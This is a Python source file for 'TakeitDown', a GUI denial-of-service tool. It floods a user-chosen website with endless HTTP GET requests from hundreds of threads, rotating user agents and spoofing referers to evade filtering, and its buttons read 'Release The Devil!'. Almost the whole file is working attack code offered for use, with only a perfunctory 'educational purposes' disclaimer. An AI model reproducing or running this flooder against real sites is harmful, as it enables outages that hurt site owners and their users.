#!/usr/bin/python3
#!/usr/bin/python

# This program is compatible with both python3 and python2
"""
author: alienwhatever

This tool is for testing and edcutional purpose only
I am not responsible for any damage you make
Use at your own risk
"""

# takeitdown.Attackit('website', port).run()

from random import choice as randomchoice
import socket
from threading import Thread
from sys import argv
from sys import exit as sysexit
from time import sleep as delay
import string
import ssl
from os import system
from PIL import ImageTk, Image
# for gui interface
from tkinter import Tk, Label, Entry, Scale, StringVar, IntVar, Canvas, Button, PhotoImage, Checkbutton, BooleanVar, messagebox

"""
Author - alienwhatever
Warning!!!!!
I am not responsible for anything you did with this too USE IT AT YOUR OWN RISKl!
THIS TOOL IS FOR TESTING AND EDUCATIONAL PURPOSES ONLY!!
"""

# class it launch DOS attack
class Attackit:
    def __init__(self, domain, port, path='/', ssl_enable=False, number_of_workers=500, master=None):
        self.master = master
        self.domain = domain
        self.port = port
        self.host = str(socket.gethostbyname(self.domain))
        self.path = path
        self.ssl_enable = ssl_enable
        self.number_of_workers = number_of_workers
        number_of_workers_ = self.number_of_workers

        self.user_agent = [
                'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.93 Mobile/15E148Safari/604.1',
                'Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.93 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPod; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.93 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (X11; Linux i686; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 10_15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/29.0 Mobile/15E148 Safari/605.1.15',
                'zilla/5.0 (iPad; CPU OS 10_15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/29.0 Mobile/15E148 Safari/605.1.15',
                'Mozilla/5.0 (iPod touch; CPU iPhone OS 10_15_7 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/29.0 Mobile/15E148 Safari/605.1.15',
                'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/82.0',
                'Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:82.0) Gecko/82.0 Firefox/82.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPod touch; CPU iPhone 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1']



    def __create_header(self, useragent, urlparameter, site_ref):    # create header with different user agent
        #header = 'GET {}?={} HTTP/1.1\r\n'.format(path, urlparameter)    # to attack with random url parameter
        header = 'GET {} HTTP/1.1\r\n'.format(self.path)
        header += 'Host: {}\r\n'.format(self.domain)
        header += 'User-Agent: {}\r\n'.format(useragent) # make difference
        header += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
        header += 'Accept-Language: en-US,en;q=0.5\r\n'    # ---- make difference ----
        header += 'Accept-Encoding: gzip, deflate\r\n'
        header += 'Upgrade-Insecure-Requests: 1\r\n'
        header += 'Cache-Control: no-store\r\n'
        header += 'Connection: keep-alive\r\n'
        #header += 'Content-Type: application/x-www-form-urlencoded\r\n'
        #header += 'Content-length: 1000\r\n'
        header += 'Referer: {}\r\n\r\n'.format(site_ref) # make difference
        return header


    # list of user agents

    # ---- credits ------
    # chrome user agents - https://www.whatismybrowser.com/guides/the-latest-user-agent/chrome
    # firefox user agents - https://www.whatismybrowser.com/guides/the-latest-user-agent/firefox
    # safari user agents = https://www.whatismybrowser.com/guides/the-latest-user-agent/safari


    def __attack(self):
        ref = ['https://www.google.com',
       'https://www.yahoo.com',
       'https://www.bing.com/',
       'https://www.yandex.com/',
       'http://www.baidu.com/',
       'http://' + self.domain + '/']

        while True:
            useragent_to_choose = str(randomchoice(self.user_agent))    # choose a random user agent from user_agent list

            # generate unique url
            random_url_parameter = string.ascii_lowercase + str(string.digits)
            random_url_parameter = str(''.join(randomchoice(random_url_parameter) for i in range(12)))
            site_ref = str(randomchoice(ref))

            header = self.__create_header(useragent_to_choose, random_url_parameter, site_ref)    # create header with difference user agent
            #print (header)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # proxy - host, port = '193.110.78.143', 8080
                s.connect((self.host, self.port))

                if self.ssl_enable:
                    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
                header = str(header)
                s.send(bytes(header, 'utf-8'))
                #print (s.recv(1024))
            except Exception as e:
                print (e)
                messagebox.showerror('', e)

            except socket.error as e:
                print (e)
                messagebox.showerror('', e)

            #finally:
                #s.close()
                #delay(3)


    def run(self):
        for _ in range(self.number_of_workers):
            t = Thread(target=self.__attack, daemon=True)
            t.start()
        t.join()

# gui interface
class GuiInterface:
    def __init__(self):
        self.master = Tk()
        self.master.title('TakeitDown')
        self.master.geometry('500x340') # width x height
        self.master.resizable(False, False)
        messagebox.showwarning('Use this tool only if you agree this','''This tool is for testing and edcutional purposes only
        I am not responsible for what you did with this tool!
        Use at your own risk''')
        # upper canvas c
        #self.c = Canvas(width=100, height=100).place(x=0, y=0)
        self.c = Canvas()
        self.c.pack(fill='both', expand=True)


        image = Image.open("./img/skull.jpg") # pic source - https://pixabay.com/illustrations/halloween-skull-biker-flames-3696046/
        image = image.resize((500, 300), Image.ANTIALIAS)
        image = ImageTk.PhotoImage(image)

        # Variables
        self.host = StringVar()
        self.port = IntVar()
        self.number_of_workers = IntVar()
        self.ssl_enable = BooleanVar()

        #image = PhotoImage('skull.png')
        Label(self.c, image=image).place(x=-1, y=-1)
        # configuration for style
        self.align = 'w'
        self.padx, self.pady = 10, 10

        self.bgcolor = 'black'
        self.fgcolor = 'red'
        self.font = ('arial', 11)
        self.label_column = 0 # column of label
        self.entry_column = 1 # column of entry


        # Label(s)
        Label(self.c, text='Domain (Exmaple - website.com)', font=self.font,
                bg=self.bgcolor, fg=self.fgcolor).grid(row=0, column=self.label_column, sticky=self.align, pady=self.pady, padx=self.padx)
        Label(self.c, text='Port (Example - 80)', font=self.font,
                bg=self.bgcolor, fg=self.fgcolor).grid(row=1, column=self.label_column, sticky=self.align, pady=self.pady, padx=self.padx)
        Label(self.c, text='Number of worker(s)', font=self.font,
                bg=self.bgcolor, fg=self.fgcolor).grid(row=2, column=self.label_column, sticky=self.align, pady=self.pady, padx=self.padx)
        # Entry(s)
        Entry(self.c, width=27, bg=self.bgcolor, fg=self.fgcolor, textvariable=self.host).grid(row=0, column=self.entry_column)
        Entry(self.c, width=27, bg=self.bgcolor, fg=self.fgcolor, textvariable=self.port).grid(row=1, column=self.entry_column)

        # Checkbox - Checkbutton
        Checkbutton(self.c, text='Enable SSL', bg=self.bgcolor, fg=self.fgcolor,
        variable=self.ssl_enable).grid(row=3, column=0, sticky=self.align, padx=self.padx)

        # Scale
        Scale(self.c, from_=1, to=999, orient='horizontal', bg=self.bgcolor, fg=self.fgcolor, variable=self.number_of_workers).grid(row=2, column=1, sticky='e')

        self.launchbutton()

        self.master.mainloop()
    # function to call DOS function (This function is used in tkinter Button's command attribute)
    def callattack(self):
        print(self.host.get())
        print(self.port.get())
        print(self.number_of_workers.get())
        #f __init__(self, domain, port, path='/', ssl_enable=False, number_of_workers=500):
        if self.host.get().strip() != '' and self.port.get() != None:
            print(self.ssl_enable.get())
            Attackit(self.host.get().strip(), self.port.get(), ssl_enable=self.ssl_enable.get(), number_of_workers=int(self.number_of_workers.get()), master=self.master).run()

    def stopbutton(self):
        Thread(target=self.callattack, daemon=True).start()
        self.b.destroy()
        self.b = Button(self.c, text='Hold The Devil!', font=self.font, command=sysexit)
        self.b.grid(row=4, column=0, sticky=self.align, pady=self.pady, padx=self.padx)
        # Canvas2 - c2
        self.c2 = Canvas()
        self.c2.pack(fill='x')

        Label(self.c2, text='Devil is attacking the website!', font=self.font).grid(column=1, row=0)

    def launchbutton(self):
        # Button
        try:
            self.b.destroy()
        except AttributeError:
            pass

        self.b = Button(self.c, text='Release The Devil!', font=self.font)
        self.b.config(command=self.stopbutton)
        self.b.grid(row=4, column=0, sticky=self.align, pady=self.pady, padx=self.padx)


GuiInterface()
